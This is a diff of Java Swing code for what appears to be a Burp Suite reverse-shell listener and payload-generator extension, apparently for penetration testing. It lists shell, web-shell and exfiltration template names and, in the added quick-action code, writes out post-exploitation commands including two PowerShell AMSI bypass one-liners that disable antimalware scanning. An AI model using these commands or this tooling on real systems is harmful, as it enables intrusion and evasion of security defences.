+        respTitle.setForeground(UITheme.TEXT_SECONDARY);
+        respTitle.setBorder(new EmptyBorder(4, 4, 4, 4));
+        respTitle.setOpaque(true);
+        respTitle.setBackground(UITheme.CARD_HEADER_BG);
+        respPanel.add(respTitle, BorderLayout.NORTH);
+        respPanel.add(responseViewer.getComponent(), BorderLayout.CENTER);
 
-        // Horizontal split: request | response
-        JSplitPane messageSplitPane = new JSplitPane(JSplitPane.HORIZONTAL_SPLIT, requestPanel, responsePanel);
-        messageSplitPane.setResizeWeight(0.5);
-        messageSplitPane.setDividerSize(5);
-        messageSplitPane.setBorder(null);
+        JSplitPane editorSplit = new JSplitPane(JSplitPane.HORIZONTAL_SPLIT, reqPanel, respPanel);
+        editorSplit.setResizeWeight(0.5);
+        editorSplit.setDividerSize(6);
+        editorSplit.setBorder(null);
 
-        // Vertical split: history table (top) | message editors (bottom)
-        JSplitPane splitPane = new JSplitPane(JSplitPane.VERTICAL_SPLIT, tableScrollPane, messageSplitPane);
-        splitPane.setDividerLocation(160);
-        splitPane.setResizeWeight(0.25);
-        splitPane.setBorder(null);
+        JSplitPane mainSplit = new JSplitPane(JSplitPane.VERTICAL_SPLIT, tableScroll, editorSplit);
+        mainSplit.setDividerLocation(180);
+        mainSplit.setResizeWeight(0.3);
+        mainSplit.setDividerSize(6);
+        mainSplit.setBorder(null);
 
-        // 2. Shell Mode - Terminal view
-        shellDisplayPane = new JTextPane();
-        shellDisplayPane.setEditable(false);
-        shellDisplayPane.setFont(new Font("Consolas", Font.BOLD, 13));
-        shellDisplayPane.setBackground(new Color(12, 12, 12)); // Deep Black
-        shellDisplayPane.setForeground(new Color(255, 255, 255)); 
-        shellDisplayPane.setCaretColor(Color.WHITE);
-        shellDisplayPane.setMargin(new Insets(5, 5, 5, 5)); // Tighter padding
-        shellDisplayPane.setOpaque(true);
-
-        shellScrollPane = new JScrollPane(shellDisplayPane);
-        shellScrollPane.setBorder(BorderFactory.createLineBorder(new Color(40, 44, 52)));
-        shellScrollPane.getViewport().setBackground(new Color(12, 12, 12));
-
-        // Style setup
-        styleNormal = shellDisplayPane.addStyle("Normal", null);
-        StyleConstants.setForeground(styleNormal, new Color(255, 59, 48)); // Vibrant Red Output (High Visibility)
-
-        styleInput = shellDisplayPane.addStyle("Input", styleNormal);
-        StyleConstants.setForeground(styleInput, new Color(0, 255, 204)); // Neon Cyan Prompt
-        StyleConstants.setBold(styleInput, true);
-
-        styleStatus = shellDisplayPane.addStyle("Status", styleNormal);
-        StyleConstants.setForeground(styleStatus, new Color(46, 204, 113)); // Vibrant Green Status
-        StyleConstants.setBold(styleStatus, true);
-
-        stylePath = shellDisplayPane.addStyle("Path", styleNormal);
-        StyleConstants.setForeground(stylePath, new Color(255, 215, 0)); // Gold/Yellow for Path
-        StyleConstants.setBold(stylePath, true);
-
-        // CardLayout Panel
-        modePanel = new JPanel(new CardLayout());
-        modePanel.add(splitPane, WEBHOOK_CARD);
-        modePanel.add(shellScrollPane, SHELL_CARD);
-        callbacks.customizeUiComponent(modePanel);
-
-        mainPanel.add(modePanel, BorderLayout.CENTER);
-
-        // Bottom panel for shell input (hidden by default)
-        bottomPanel = new JPanel(new BorderLayout());
-        bottomPanel.setBorder(new EmptyBorder(5, 5, 5, 5));
-        callbacks.customizeUiComponent(bottomPanel);
-
-        inputField = new JTextField();
-        inputField.setFont(new Font("Monospaced", Font.PLAIN, 12));
-        inputField.setEnabled(false);
-        callbacks.customizeUiComponent(inputField);
-
-        sendButton = new JButton("Send");
-        sendButton.setEnabled(false);
-        callbacks.customizeUiComponent(sendButton);
-
-        JButton clearShellButton = new JButton("Clear Shell");
-        clearShellButton.addActionListener(e -> shellDisplayPane.setText(""));
-        callbacks.customizeUiComponent(clearShellButton);
-
-        JPanel inputPanel = new JPanel(new BorderLayout(5, 5));
-        promptLabel = new JLabel(" Command:");
-        inputPanel.add(promptLabel, BorderLayout.WEST);
-        inputPanel.add(inputField, BorderLayout.CENTER);
-
-        JPanel actionButtonPanel = new JPanel(new FlowLayout(FlowLayout.LEFT, 5, 0));
-        actionButtonPanel.add(sendButton);
-        actionButtonPanel.add(clearShellButton);
-        inputPanel.add(actionButtonPanel, BorderLayout.EAST);
-
-        bottomPanel.add(inputPanel, BorderLayout.CENTER);
-        bottomPanel.setVisible(false);
-
-        mainPanel.add(bottomPanel, BorderLayout.SOUTH);
-
-        // Initial listeners setup
-        if (sendButton.getActionListeners().length == 0) {
-            setupCommandListeners();
-        }
-
-        tabbedPane.addTab("Listener", mainPanel);
-
-        // Payload Generator Tab
-        JPanel payloadPanel = createPayloadPanel();
-        tabbedPane.addTab("Payload Generator", payloadPanel);
-
-        add(tabbedPane, BorderLayout.CENTER);
-    }
-
-    /**
-     * Creates the enhanced payload generator panel with categorized payloads,
-     * OS selection, encoding options, and improved UI.
-     */
-    private JPanel createPayloadPanel() {
-        JPanel panel = new JPanel(new BorderLayout(10, 10));
-        panel.setBorder(BorderFactory.createTitledBorder(
-                BorderFactory.createLineBorder(Color.GRAY, 1, true),
-                "Payload Generator", TitledBorder.CENTER, TitledBorder.TOP,
-                new Font("Arial", Font.BOLD, 14)));
-
-        JPanel controls = new JPanel(new GridBagLayout());
-        GridBagConstraints gbc = new GridBagConstraints();
-        gbc.insets = new Insets(4, 5, 4, 5);
-        gbc.anchor = GridBagConstraints.WEST;
-
-        // --- UI Components ---
-        payloadCategoryCombo = new JComboBox<>(new String[] { "Reverse/Bind Shell", "Web Shell", "Data Exfiltration" });
-        osCombo = new JComboBox<>(new String[] { "Linux/macOS", "Windows" });
-        shellTypeLabel = new JLabel("Shell Type:");
-        shellTypeCombo = new JComboBox<>(new String[] { "Reverse", "Bind" });
-        JLabel templateLabel = new JLabel("Template:");
-        payloadTemplateCombo = new JComboBox<>();
-        ipLabel = new JLabel("Attacker IP:");
-        ipCombo = new JComboBox<>();
-        portLabel = new JLabel("Port:");
-        payloadPortField = new JTextField("4444", 8);
-        JLabel encodingLabel = new JLabel("Encoding:");
-        encodingCombo = new JComboBox<>(new String[] { "None", "Base64", "URL" });
-
-        JButton autoFillButton = new JButton("Auto-fill from Listener");
-        JButton generateButton = new JButton("Generate");
-        JButton copyButton = new JButton("Copy Payload");
-
-        // --- Populate IP ComboBox ---
-        List<String> ips = getAvailableIpAddresses();
-        ipCombo.setEditable(true);
-        ipCombo.addItem("127.0.0.1");
-        for (String ip : ips) {
-            ipCombo.addItem(ip);
-        }
-        if (!ips.isEmpty()) {
-            ipCombo.setSelectedItem(ips.get(0));
-        }
-
-        // --- Layout Controls ---
-        int y = 0;
-        gbc.gridx = 0;
-        gbc.gridy = y;
-        controls.add(new JLabel("Category:"), gbc);
-        gbc.gridx = 1;
-        gbc.gridy = y++;
-        gbc.fill = GridBagConstraints.HORIZONTAL;
-        controls.add(payloadCategoryCombo, gbc);
-
-        gbc.gridx = 0;
-        gbc.gridy = y;
-        gbc.fill = GridBagConstraints.NONE;
-        controls.add(new JLabel("Target OS:"), gbc);
-        gbc.gridx = 1;
-        gbc.gridy = y++;
-        gbc.fill = GridBagConstraints.HORIZONTAL;
-        controls.add(osCombo, gbc);
-
-        gbc.gridx = 0;
-        gbc.gridy = y;
-        gbc.fill = GridBagConstraints.NONE;
-        controls.add(shellTypeLabel, gbc);
-        gbc.gridx = 1;
-        gbc.gridy = y++;
-        gbc.fill = GridBagConstraints.HORIZONTAL;
-        controls.add(shellTypeCombo, gbc);
-
-        gbc.gridx = 0;
-        gbc.gridy = y;
-        gbc.fill = GridBagConstraints.NONE;
-        controls.add(templateLabel, gbc);
-        gbc.gridx = 1;
-        gbc.gridy = y++;
-        gbc.fill = GridBagConstraints.HORIZONTAL;
-        controls.add(payloadTemplateCombo, gbc);
-
-        gbc.gridx = 0;
-        gbc.gridy = y;
-        gbc.fill = GridBagConstraints.NONE;
-        controls.add(ipLabel, gbc);
-        gbc.gridx = 1;
-        gbc.gridy = y++;
-        gbc.fill = GridBagConstraints.HORIZONTAL;
-        controls.add(ipCombo, gbc);
-
-        gbc.gridx = 0;
-        gbc.gridy = y;
-        gbc.fill = GridBagConstraints.NONE;
-        controls.add(portLabel, gbc);
-        gbc.gridx = 1;
-        gbc.gridy = y++;
-        gbc.fill = GridBagConstraints.HORIZONTAL;
-        controls.add(payloadPortField, gbc);
-
-        gbc.gridx = 0;
-        gbc.gridy = y;
-        gbc.fill = GridBagConstraints.NONE;
-        controls.add(encodingLabel, gbc);
-        gbc.gridx = 1;
-        gbc.gridy = y++;
-        gbc.fill = GridBagConstraints.HORIZONTAL;
-        controls.add(encodingCombo, gbc);
-
-        // --- Buttons Panel ---
-        JPanel buttonPanel = new JPanel(new FlowLayout(FlowLayout.LEFT, 5, 0));
-        buttonPanel.add(autoFillButton);
-        buttonPanel.add(generateButton);
-        buttonPanel.add(copyButton);
-        gbc.gridx = 1;
-        gbc.gridy = y;
-        controls.add(buttonPanel, gbc);
-
-        panel.add(controls, BorderLayout.NORTH);
-
-        // --- Payload Editor (native Burp ITextEditor for search + theme support) ---
-        payloadEditor = callbacks.createTextEditor();
-        payloadEditor.setEditable(false);
-        callbacks.customizeUiComponent(payloadEditor.getComponent());
-        JPanel payloadWrapper = new JPanel(new BorderLayout());
-        payloadWrapper.setBorder(BorderFactory.createTitledBorder(
-                BorderFactory.createLineBorder(Color.GRAY, 1, true), "Generated Payload",
-                TitledBorder.LEFT, TitledBorder.TOP, new Font("Arial", Font.PLAIN, 12)));
-        payloadWrapper.add(payloadEditor.getComponent(), BorderLayout.CENTER);
-        panel.add(payloadWrapper, BorderLayout.CENTER);
-
-        // --- Action Listeners ---
-        ActionListener optionListener = e -> updatePayloadOptions();
-        payloadCategoryCombo.addActionListener(optionListener);
-        osCombo.addActionListener(optionListener);
-        shellTypeCombo.addActionListener(optionListener);
-
-        autoFillButton.addActionListener(e -> {
-            if (isListening && currentPort != -1) {
-                if (ipCombo.getItemCount() > 0) {
-                    ipCombo.setSelectedIndex(ipCombo.getItemCount() > 1 ? 1 : 0); // Prefer first non-localhost IP
-                }
-                payloadPortField.setText(String.valueOf(currentPort));
-            } else {
-                JOptionPane.showMessageDialog(this, "Listener is not running.", "Info",
-                        JOptionPane.INFORMATION_MESSAGE);
-            }
-        });
-
-        generateButton.addActionListener(e -> generatePayload());
-        copyButton.addActionListener(e -> {
-            String payload = new String(payloadEditor.getText(), StandardCharsets.UTF_8);
-            if (!payload.isEmpty()) {
-                StringSelection stringSelection = new StringSelection(payload);
-                Toolkit.getDefaultToolkit().getSystemClipboard().setContents(stringSelection, null);
-                JOptionPane.showMessageDialog(this, "Payload copied to clipboard!", "Success",
-                        JOptionPane.INFORMATION_MESSAGE);
-            }
-        });
-
-        // Initialize options
-        updatePayloadOptions();
-
+        panel.add(filterBar, BorderLayout.NORTH);
+        panel.add(mainSplit, BorderLayout.CENTER);
         return panel;
     }
 
-    /**
-     * Dynamically updates the available templates and UI components based on the
-     * selected
-     * payload category, OS, and shell type.
-     */
-    private void updatePayloadOptions() {
-        String category = (String) payloadCategoryCombo.getSelectedItem();
-        String os = (String) osCombo.getSelectedItem();
-        String shellType = (String) shellTypeCombo.getSelectedItem();
+    // =========================================================================
+    // SHELL TERMINAL & MULTI-SESSION PANEL BUILDER
+    // =========================================================================
+    private JPanel createShellPanel() {
+        JPanel panel = new JPanel(new BorderLayout(0, 6));
+        panel.setOpaque(false);
 
-        DefaultComboBoxModel<String> model = new DefaultComboBoxModel<>();
-        boolean isShell = "Reverse/Bind Shell".equals(category);
+        // --- Top: Multi-Session Manager Card ---
+        JPanel sessionManagerCard = new JPanel(new BorderLayout(8, 4));
+        sessionManagerCard.setBackground(UITheme.CARD_BG);
+        sessionManagerCard.setBorder(BorderFactory.createCompoundBorder(
+                new LineBorder(UITheme.BORDER_LIGHT, 1),
+                new EmptyBorder(6, 10, 6, 10)
+        ));
 
-        // Show/hide components based on category
-        shellTypeLabel.setVisible(isShell);
-        shellTypeCombo.setVisible(isShell);
-        ipLabel.setVisible(isShell || "Data Exfiltration".equals(category) || "Reverse".equals(shellType));
-        ipCombo.setVisible(isShell || "Data Exfiltration".equals(category) || "Reverse".equals(shellType));
-        portLabel.setVisible(isShell || "Data Exfiltration".equals(category));
-        payloadPortField.setVisible(isShell || "Data Exfiltration".equals(category));
+        // Session Table
+        String[] sessionCols = { "#", "Remote Host", "Port", "OS Type", "Connected At", "Uptime", "Status" };
+        sessionTableModel = new DefaultTableModel(sessionCols, 0) {
+            @Override public boolean isCellEditable(int row, int col) { return false; }
+        };
 
-        if (isShell) {
-            if ("Windows".equals(os)) {
-                model.addElement("Powershell #1");
-                model.addElement("Powershell #2 (TLS)");
-                model.addElement("Netcat");
-                model.addElement("C#");
-            } else { // Linux/macOS
-                model.addElement("Python3");
-                model.addElement("Bash TCP");
-                model.addElement("Bash UDP");
-                model.addElement("Netcat (with -e)");
-                model.addElement("Netcat (mkfifo)");
-                model.addElement("Perl");
-                model.addElement("PHP");
-                model.addElement("Ruby");
-                model.addElement("Java");
+        sessionTable = new JTable(sessionTableModel);
+        sessionTable.setFont(UITheme.FONT_CODE);
+        sessionTable.getTableHeader().setFont(UITheme.FONT_SUBTITLE);
+        sessionTable.setRowHeight(22);
+        sessionTable.setSelectionMode(ListSelectionModel.SINGLE_SELECTION);
+        sessionTable.setShowGrid(true);
+        sessionTable.setGridColor(UITheme.BORDER_LIGHT);
+
+        sessionTable.getColumnModel().getColumn(0).setPreferredWidth(40);
+        sessionTable.getColumnModel().getColumn(1).setPreferredWidth(120);
+        sessionTable.getColumnModel().getColumn(2).setPreferredWidth(60);
+        sessionTable.getColumnModel().getColumn(3).setPreferredWidth(110);
+        sessionTable.getColumnModel().getColumn(4).setPreferredWidth(140);
+        sessionTable.getColumnModel().getColumn(5).setPreferredWidth(90);
+        sessionTable.getColumnModel().getColumn(6).setPreferredWidth(80);
+
+        sessionTable.getSelectionModel().addListSelectionListener(e -> {
+            if (!e.getValueIsAdjusting()) {
+                int row = sessionTable.getSelectedRow();
+                if (row >= 0) {
+                    int sid = (Integer) sessionTableModel.getValueAt(row, 0);
+                    sessionManager.selectSessionById(sid);
+                }
             }
-            ipLabel.setText("Bind".equals(shellType) ? "Target IP:" : "Attacker IP:");
-        } else if ("Web Shell".equals(category)) {
-            model.addElement("PHP Simple Command Shell");
-            model.addElement("PHP Full-featured Shell");
-            model.addElement("JSP Simple Command Shell");
-            model.addElement("ASP.NET Simple Command Shell");
-        } else { // Data Exfiltration
-            model.addElement("Curl (File Upload)");
-            model.addElement("Wget (File Upload)");
-            model.addElement("DNS Exfil (nslookup)");
-        }
+        });
 
-        payloadTemplateCombo.setModel(model);
+        JScrollPane sessionScroll = new JScrollPane(sessionTable);
+        sessionScroll.setPreferredSize(new Dimension(0, 85));
+        sessionScroll.setBorder(new LineBorder(UITheme.BORDER_LIGHT, 1));
+
+        // Session Manager Actions
+        JPanel sessionActions = new JPanel(new FlowLayout(FlowLayout.RIGHT, 6, 0));
+        sessionActions.setOpaque(false);
+
+        uploadFileButton = new ModernButton("UPLOAD FILE TO SHELL", UITheme.STATUS_INFO);
+        exportLogButton = new ModernButton("EXPORT SESSION LOG", new Color(71, 85, 105));
+        terminateSessionButton = new ModernButton("TERMINATE SESSION", UITheme.STATUS_DANGER);
+
+        uploadFileButton.setEnabled(false);
+        exportLogButton.setEnabled(false);
+        terminateSessionButton.setEnabled(false);
+
+        uploadFileButton.addActionListener(e -> showUploadFileDialog());
+        exportLogButton.addActionListener(e -> exportActiveSessionLog());
+        terminateSessionButton.addActionListener(e -> {
+            ShellSession current = sessionManager.getActiveSession();
+            if (current != null) {
+                sessionManager.closeSession(current.getId());
+            }
+        });
+
+        sessionActions.add(uploadFileButton);
+        sessionActions.add(exportLogButton);
+        sessionActions.add(terminateSessionButton);
+
+        sessionManagerCard.add(new JLabel("ACTIVE REVERSE SHELL SESSIONS:"), BorderLayout.NORTH);
+        sessionManagerCard.add(sessionScroll, BorderLayout.CENTER);
+        sessionManagerCard.add(sessionActions, BorderLayout.SOUTH);
+
+        // --- Center: Active Session Terminal Display ---
+        shellTerminalContainer = new JPanel(new BorderLayout());
+        shellTerminalContainer.setBackground(UITheme.TERM_BG);
+        shellTerminalContainer.setBorder(new LineBorder(UITheme.BORDER_DARK, 1));
+
+        JLabel waitingShellLabel = new JLabel("Waiting for inbound reverse shell sessions...", SwingConstants.CENTER);
+        waitingShellLabel.setFont(UITheme.FONT_CODE);
+        waitingShellLabel.setForeground(UITheme.TEXT_MUTED);
+        shellTerminalContainer.add(waitingShellLabel, BorderLayout.CENTER);
+
+        // --- Bottom: Assist Bar & Command Input Bar ---
+        JPanel shellBottom = new JPanel(new BorderLayout(0, 6));
+        shellBottom.setOpaque(false);
+
+        // 1. Assist Bar (Quick commands & Session Status)
+        JPanel assistBar = new JPanel(new BorderLayout(8, 0));
+        assistBar.setBackground(UITheme.CARD_BG);
+        assistBar.setBorder(new EmptyBorder(4, 8, 4, 8));
+
+        shellStatusLabel = new JLabel("STATUS: WAITING FOR INBOUND CONNECTION");
+        shellStatusLabel.setFont(UITheme.FONT_SUBTITLE);
+        shellStatusLabel.setForeground(UITheme.TEXT_MUTED);
+
+        JPanel quickActionsPanel = new JPanel(new FlowLayout(FlowLayout.RIGHT, 6, 0));
+        quickActionsPanel.setOpaque(false);
+
+        JLabel quickLabel = new JLabel("QUICK ACTION:");
+        quickLabel.setFont(UITheme.FONT_SUBTITLE);
+        quickLabel.setForeground(UITheme.TEXT_SECONDARY);
+
+        quickCommandsCombo = new JComboBox<>(new String[] {
+                "Select Command...",
+                "Spawn Bash PTY (Python 3)",
+                "Spawn Full TTY (Python 3 + Term)",
+                "Stabilize Terminal (stty raw -echo; fg)",
+                "Whoami & Host (whoami; id; hostname)",
+                "OS & Kernel Info (uname -a / systeminfo)",
+                "Network Config (ip a / ipconfig)",
+                "Check Sudo Permissions (sudo -l)",
+                "PowerShell AMSI Bypass (Memory Patch)",
+                "PowerShell Reflection Bypass",
+                "Clear Terminal Screen"
+        });
+        UITheme.styleComboBox(quickCommandsCombo);
+        quickCommandsCombo.setPreferredSize(new Dimension(240, 26));
+
+        quickCommandsCombo.addActionListener(e -> {
+            int idx = quickCommandsCombo.getSelectedIndex();
+            if (idx <= 0) return;
+            String selected = (String) quickCommandsCombo.getSelectedItem();
+            quickCommandsCombo.setSelectedIndex(0);
+            executeQuickAction(selected);
+        });
+
+        quickActionsPanel.add(quickLabel);
+        quickActionsPanel.add(quickCommandsCombo);
+
+        assistBar.add(shellStatusLabel, BorderLayout.WEST);
+        assistBar.add(quickActionsPanel, BorderLayout.EAST);
+
+        // 2. Command Input Bar
+        JPanel inputBar = new JPanel(new BorderLayout(8, 0));
+        inputBar.setBackground(UITheme.CARD_BG);
+        inputBar.setBorder(new EmptyBorder(6, 8, 6, 8));
+
+        JLabel promptText = new JLabel("COMMAND >");
+        promptText.setFont(UITheme.FONT_CODE_BOLD);
+        promptText.setForeground(UITheme.STATUS_INFO);
+
+        shellInputField = new JTextField();
+        shellInputField.setFont(UITheme.FONT_CODE);
+        shellInputField.setEnabled(false);
+        UITheme.styleTextField(shellInputField);
+
+        // Command history navigation
+        shellInputField.addKeyListener(new KeyAdapter() {
+            @Override
+            public void keyPressed(KeyEvent e) {
+                ShellSession current = sessionManager.getActiveSession();
+                if (current == null) return;
+                List<String> hist = current.getCommandHistory();
+                if (e.getKeyCode() == KeyEvent.VK_UP && !hist.isEmpty()) {
+                    shellInputField.setText(hist.get(hist.size() - 1));
+                }
+            }
+        });
+
+        JPanel inputActions = new JPanel(new FlowLayout(FlowLayout.RIGHT, 6, 0));
+        inputActions.setOpaque(false);
+
+        shellSendButton = new ModernButton("SEND", UITheme.STATUS_SUCCESS);
+        shellSendButton.setEnabled(false);
+
+        shellCtrlCButton = new ModernButton("CTRL+C", UITheme.STATUS_WARNING);
+        shellCtrlCButton.setEnabled(false);
+
+        shellClearButton = new ModernButton("CLEAR", UITheme.STATUS_INFO);
+
+        shellSendButton.addActionListener(e -> sendCurrentShellCommand());
+        shellInputField.addActionListener(e -> sendCurrentShellCommand());
+        shellCtrlCButton.addActionListener(e -> {
+            ShellSession current = sessionManager.getActiveSession();
+            if (current != null) current.sendSignalCtrlC(ioExecutor);
+        });
+        shellClearButton.addActionListener(e -> {
+            ShellSession current = sessionManager.getActiveSession();
+            if (current != null) current.getDisplayPane().setText("");
+        });
+
+        inputActions.add(shellSendButton);
+        inputActions.add(shellCtrlCButton);
+        inputActions.add(shellClearButton);
+
+        inputBar.add(promptText, BorderLayout.WEST);
+        inputBar.add(shellInputField, BorderLayout.CENTER);
+        inputBar.add(inputActions, BorderLayout.EAST);
+
+        shellBottom.add(assistBar, BorderLayout.NORTH);
+        shellBottom.add(inputBar, BorderLayout.CENTER);
+
+        JSplitPane shellSplit = new JSplitPane(JSplitPane.VERTICAL_SPLIT, sessionManagerCard, shellTerminalContainer);
+        shellSplit.setDividerLocation(130);
+        shellSplit.setDividerSize(6);
+        shellSplit.setBorder(null);
+
+        panel.add(shellSplit, BorderLayout.CENTER);
+        panel.add(shellBottom, BorderLayout.SOUTH);
+        return panel;
     }
 
-    private void generatePayload() {
-        String ip = (String) ipCombo.getSelectedItem();
-        String portStr = payloadPortField.getText().trim();
-        int port;
+    private void updateSessionTable() {
+        sessionTableModel.setRowCount(0);
+        List<ShellSession> list = sessionManager.getAllSessions();
+        ShellSession active = sessionManager.getActiveSession();
 
-        try {
-            port = Integer.parseInt(portStr);
-            if (port < 1 || port > 65535)
-                throw new NumberFormatException();
-        } catch (NumberFormatException ex) {
-            JOptionPane.showMessageDialog(this, "Invalid port number (must be 1-65535).", "Error",
-                    JOptionPane.ERROR_MESSAGE);
+        for (ShellSession s : list) {
+            sessionTableModel.addRow(new Object[] {
+                    s.getId(),
+                    s.getRemoteAddress(),
+                    s.getRemotePort(),
+                    s.getShellType().getLabel(),
+                    s.getConnectedTimeString(),
+                    s.getUptime(),
+                    s.isActive() ? "ACTIVE" : "CLOSED"
+            });
+        }
+
+        if (active != null) {
+            for (int i = 0; i < sessionTableModel.getRowCount(); i++) {
+                if ((Integer) sessionTableModel.getValueAt(i, 0) == active.getId()) {
+                    sessionTable.setRowSelectionInterval(i, i);
+                    break;
+                }
+            }
+        }
+    }
+
+    private void displaySessionTerminal(ShellSession session) {
+        shellTerminalContainer.removeAll();
+        JScrollPane scroll = new JScrollPane(session.getDisplayPane());
+        scroll.setBorder(null);
+        scroll.getViewport().setBackground(UITheme.TERM_BG);
+        shellTerminalContainer.add(scroll, BorderLayout.CENTER);
+        shellTerminalContainer.revalidate();
+        shellTerminalContainer.repaint();
+    }
+
+    private void sendCurrentShellCommand() {
+        ShellSession current = sessionManager.getActiveSession();
+        if (current == null || !current.isActive()) return;
+        String cmd = shellInputField.getText().trim();
+        if (cmd.isEmpty()) return;
+
+        current.sendCommand(cmd, ioExecutor);
+        shellInputField.setText("");
+    }
+
+    private void showUploadFileDialog() {
+        ShellSession current = sessionManager.getActiveSession();
+        if (current == null || !current.isActive()) return;
+
+        JFileChooser fc = new JFileChooser();
+        fc.setDialogTitle("Select File to Upload to Remote Target");
+        if (fc.showOpenDialog(this) == JFileChooser.APPROVE_OPTION) {
+            File selectedFile = fc.getSelectedFile();
+            String defaultDest = current.getShellType() == ShellSession.SessionShellType.WINDOWS_PS || current.getShellType() == ShellSession.SessionShellType.WINDOWS_CMD
+                    ? "C:\\Users\\Public\\" + selectedFile.getName()
+                    : "/tmp/" + selectedFile.getName();
+
+            String destPath = JOptionPane.showInputDialog(this, "Enter Destination Remote File Path:", defaultDest);
+            if (destPath != null && !destPath.trim().isEmpty()) {
+                current.uploadFileChunked(selectedFile, destPath.trim(), ioExecutor);
+            }
+        }
+    }
+
+    private void exportActiveSessionLog() {
+        ShellSession current = sessionManager.getActiveSession();
+        if (current == null) return;
+
+        JFileChooser fc = new JFileChooser();
+        fc.setDialogTitle("Export Session Transcript");
+        fc.setSelectedFile(new File("session_" + current.getId() + "_transcript.md"));
+        if (fc.showSaveDialog(this) == JFileChooser.APPROVE_OPTION) {
+            File target = fc.getSelectedFile();
+            try {
+                current.exportLogToMarkdown(target);
+                JOptionPane.showMessageDialog(this, "Session transcript exported successfully to:\n" + target.getAbsolutePath(), "Exported", JOptionPane.INFORMATION_MESSAGE);
+            } catch (IOException e) {
+                JOptionPane.showMessageDialog(this, "Error exporting log: " + e.getMessage(), "Error", JOptionPane.ERROR_MESSAGE);
+            }
+        }
+    }
+
+    private void executeQuickAction(String action) {
+        ShellSession current = sessionManager.getActiveSession();
+        if (current == null || !current.isActive()) return;
+
+        if ("Clear Terminal Screen".equals(action)) {
+            current.getDisplayPane().setText("");
             return;
         }
 
-        if (ip == null || ip.trim().isEmpty()) {
-            if (shellTypeCombo.isVisible() && "Reverse".equals(shellTypeCombo.getSelectedItem())) {
-                JOptionPane.showMessageDialog(this, "IP is required for this payload type.", "Error",
-                        JOptionPane.ERROR_MESSAGE);
-                return;
+        String cmd = "";
+        switch (action) {
+            case "Spawn Bash PTY (Python 3)":
+                cmd = "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'";
+                break;
+            case "Spawn Full TTY (Python 3 + Term)":
+                cmd = "python3 -c 'import pty,os; pty.spawn(\"/bin/bash\"); os.system(\"export TERM=xterm-256color\")'";
+                break;
+            case "Stabilize Terminal (stty raw -echo; fg)":
+                cmd = "stty raw -echo; fg";
+                break;
+            case "Whoami & Host (whoami; id; hostname)":
+                cmd = "whoami; id; hostname";
+                break;
+            case "OS & Kernel Info (uname -a / systeminfo)":
+                cmd = "uname -a; cat /etc/os-release 2>/dev/null || systeminfo";
+                break;
+            case "Network Config (ip a / ipconfig)":
+                cmd = "ip a || ifconfig 2>/dev/null || ipconfig /all";
+                break;
+            case "Check Sudo Permissions (sudo -l)":
+                cmd = "sudo -l";
+                break;
+            case "PowerShell AMSI Bypass (Memory Patch)":
+                cmd = "$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');$f=$a.GetField('amsiInitFailed','NonPublic,Static');$f.SetValue($null,$true)";
+                break;
+            case "PowerShell Reflection Bypass":
+                cmd = "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiSession','NonPublic,Static').SetValue($null,$null)";
+                break;
+        }
+
+        if (!cmd.isEmpty()) {
+            current.sendCommand(cmd, ioExecutor);
+        }
+    }
+
+    // =========================================================================
+    // PAYLOAD GENERATOR TAB BUILDER
+    // =========================================================================
+    private JPanel createPayloadGeneratorTab() {
+        JPanel panel = new JPanel(new BorderLayout(8, 8));
+        panel.setOpaque(false);
+
+        // Top Control Grid
+        JPanel controlsCard = new JPanel(new BorderLayout(0, 8));
+        controlsCard.setBackground(UITheme.CARD_BG);
+        controlsCard.setBorder(UITheme.createCardBorder());
+
+        // Row 1: Search & Categories
+        JPanel row1 = new JPanel(new GridBagLayout());
+        row1.setOpaque(false);
+        GridBagConstraints gbc = new GridBagConstraints();
+        gbc.insets = new Insets(3, 5, 3, 5);
+        gbc.fill = GridBagConstraints.HORIZONTAL;
+
+        // Search
+        gbc.gridx = 0; gbc.gridy = 0; gbc.weightx = 0.0;
+        JLabel searchLabel = new JLabel("SEARCH TEMPLATES:");
+        searchLabel.setFont(UITheme.FONT_SUBTITLE);
+        searchLabel.setForeground(UITheme.TEXT_SECONDARY);
+        row1.add(searchLabel, gbc);
+
+        gbc.gridx = 1; gbc.gridy = 0; gbc.weightx = 0.3;
+        payloadSearchField = new JTextField();
+        UITheme.styleTextField(payloadSearchField);
+        payloadSearchField.setToolTipText("Filter by name, tool, or keyword (e.g. socat, tls, pty, amsi)");
+        row1.add(payloadSearchField, gbc);
+
+        // Category
+        gbc.gridx = 2; gbc.gridy = 0; gbc.weightx = 0.0;
+        JLabel catLabel = new JLabel("CATEGORY:");
+        catLabel.setFont(UITheme.FONT_SUBTITLE);
+        catLabel.setForeground(UITheme.TEXT_SECONDARY);
+        row1.add(catLabel, gbc);
+
+        gbc.gridx = 3; gbc.gridy = 0; gbc.weightx = 0.3;
+        payloadCategoryCombo = new JComboBox<>(new String[] {
+                "All Categories",
+                PayloadCategory.REVERSE_SHELL.getDisplayName(),
+                PayloadCategory.BIND_SHELL.getDisplayName(),
+                PayloadCategory.WEB_SHELL.getDisplayName(),
+                PayloadCategory.DATA_EXFILTRATION.getDisplayName(),
+                PayloadCategory.STAGERS_HELPERS.getDisplayName()
+        });
+        UITheme.styleComboBox(payloadCategoryCombo);
+        row1.add(payloadCategoryCombo, gbc);
+
+        // OS
+        gbc.gridx = 4; gbc.gridy = 0; gbc.weightx = 0.0;
+        JLabel osLabel = new JLabel("TARGET OS:");
+        osLabel.setFont(UITheme.FONT_SUBTITLE);
+        osLabel.setForeground(UITheme.TEXT_SECONDARY);
+        row1.add(osLabel, gbc);
+
+        gbc.gridx = 5; gbc.gridy = 0; gbc.weightx = 0.2;
+        payloadOsCombo = new JComboBox<>(new String[] {
+                "All Platforms",
+                "Linux / macOS",
+                "Windows",
+                "Web / Any",
+                "Cross-Platform"
+        });
+        UITheme.styleComboBox(payloadOsCombo);
+        row1.add(payloadOsCombo, gbc);
+
+        // Row 2: Template Selection & Parameters
+        JPanel row2 = new JPanel(new GridBagLayout());
+        row2.setOpaque(false);
+
+        // Template Combo
+        gbc.gridx = 0; gbc.gridy = 0; gbc.weightx = 0.0;
+        JLabel tplLabel = new JLabel("TEMPLATE:");
+        tplLabel.setFont(UITheme.FONT_SUBTITLE);
+        tplLabel.setForeground(UITheme.TEXT_SECONDARY);
+        row2.add(tplLabel, gbc);
+
+        gbc.gridx = 1; gbc.gridy = 0; gbc.weightx = 0.4;
+        payloadTemplateCombo = new JComboBox<>();
